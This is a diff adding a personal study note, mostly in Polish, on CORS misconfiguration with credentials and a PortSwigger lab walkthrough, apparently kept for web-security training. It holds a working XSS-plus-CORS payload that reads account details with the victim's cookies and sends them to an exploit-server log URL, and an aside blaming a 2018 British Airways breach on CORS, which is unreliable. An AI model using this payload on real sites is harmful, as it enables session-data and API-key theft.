@@ -1,0 +1,48 @@
+CORS (Cross-Origin Resource Sharing) to mechanizm który kontroluje czy strona z jednej domeny może robić requesty do innej domeny.
+
+Access-Control-Allow-Credentials: true
+Mówi przeglądarce: "możesz wysyłać requesty z cookies/sesją do tej domeny z innego origin
+
+Podatna konfiguracja wygląda tak:
+Access-Control-Allow-Origin: https://attacker.com   ← dynamicznie odbija origin
+Access-Control-Allow-Credentials: true
+
+
+Realny przypadek
+W 2018 roku znaleziono podobny błąd w British Airways – CORS był źle skonfigurowany i pozwalał na kradzież danych użytkowników. Wyciek dotknął ~500,000 klientów. 💀
+
+___
+Co się dzieje krok po kroku?
+
+Ofiara jest zalogowana w banku (ma sesję w cookies)
+Wchodzi na attacker.com (np. przez link w mailu/phishing)
+JavaScript po cichu robi request do banku z jej sesją
+Bank widzi prawidłowe cookies → zwraca dane przelewów
+Skrypt wysyła te dane do hakera
+Ofiara nic nie widzi – strona wygląda normalnie
+
+____
+
+Lab: CORS vulnerability with trusted insecure protocols
+
+
+1. intercept to login
+2. burp: deshboard>audit items: AJAX request /accountDetails with Access Control Allow Credentails
+3. Repeater: resubmit it with the added header 
+Origin: http://subdomain.0ad2003604a2a8e0808603ec008c0048.web-security-academy.net
+4. server odpowiada confirming that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP:
+Access-Control-Allow-Origin: http://subdomain.0ad2003604a2a8e0808603ec008c0048.web-security-academy.net
+Access-Control-Allow-Credentials: true
+
+
+
+5/Open a product page, click Check stock and observe that it is loaded using a HTTP URL on a subdomain.
+Observe that the productID parameter is vulnerable to XSS.
+
+In the browser, go to the exploit server and enter the following HTML, replacing YOUR-LAB-ID with your unique lab URL and YOUR-EXPLOIT-SERVER-ID with your exploit server ID:
+<script>
+    document.location="http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+Click View exploit. Observe that the exploit works - you have landed on the log page and your API key is in the URL.
+Go back to the exploit server and click Deliver exploit to victim.
+Click Access log, retrieve and submit the victim's API key to complete the lab. 
